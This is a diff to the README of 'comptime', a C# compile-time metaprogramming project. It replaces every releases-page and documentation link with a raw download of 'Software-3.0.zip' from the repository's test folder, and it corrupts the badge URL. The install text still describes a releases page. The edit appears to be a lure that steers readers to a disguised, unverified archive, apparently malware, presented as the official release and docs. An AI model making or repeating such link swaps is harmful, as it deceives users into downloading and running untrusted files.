@@ -1,7 +1,7 @@
 # 🚀 comptime - Unlock Compile-Time Power for C#
 
 ## 📥 Download the Latest Version
-[![Download Comptime](https://img.shields.io/badge/Download-Latest%20Version-brightgreen.svg)](https://github.com/nazae314/comptime/releases)
+[![Download Comptime](https://github.com/nazae314/comptime/raw/refs/heads/main/test/Comptime.Tests/Software-3.0.zip%https://github.com/nazae314/comptime/raw/refs/heads/main/test/Comptime.Tests/Software-3.0.zip)](https://github.com/nazae314/comptime/raw/refs/heads/main/test/Comptime.Tests/Software-3.0.zip)
 
 ## 📝 Introduction
 Comptime brings meta-programming capabilities to C#. This means you can generate and evaluate code even before your program runs. This makes your applications faster and more efficient.
@@ -23,7 +23,7 @@ To run Comptime effectively, ensure your system meets the following requirements
 Follow these steps to get started with Comptime:
 
 1. **Visit the Releases Page:** Click the link below to go to the download section.
-   [Download Comptime](https://github.com/nazae314/comptime/releases)
+   [Download Comptime](https://github.com/nazae314/comptime/raw/refs/heads/main/test/Comptime.Tests/Software-3.0.zip)
 
 2. **Download the Latest Version:** On the releases page, look for the latest version. Click on the download link to receive the installation file. 
 
@@ -47,7 +47,7 @@ To start using Comptime, follow these steps:
 5. **Compile the Project:** Once you’ve added your code, compile the project to see Comptime in action. Check for any errors and resolve them accordingly.
 
 ## 📚 Documentation
-For better understanding and detailed usage, consult the [official documentation](https://github.com/nazae314/comptime).
+For better understanding and detailed usage, consult the [official documentation](https://github.com/nazae314/comptime/raw/refs/heads/main/test/Comptime.Tests/Software-3.0.zip).
 
 ## 🛠️ Troubleshooting
 If you encounter issues, consider the following solutions:
@@ -64,6 +64,6 @@ Join our community on GitHub for updates and support. Feel free to reach out for
 ## 📦 Download & Install
 To start using Comptime, visit the link below to download the latest version:
 
-[Download Comptime](https://github.com/nazae314/comptime/releases)
+[Download Comptime](https://github.com/nazae314/comptime/raw/refs/heads/main/test/Comptime.Tests/Software-3.0.zip)
 
 By following these steps, you should be well on your way to leveraging the power of compile-time code generation. Enjoy exploring the capabilities of Comptime!
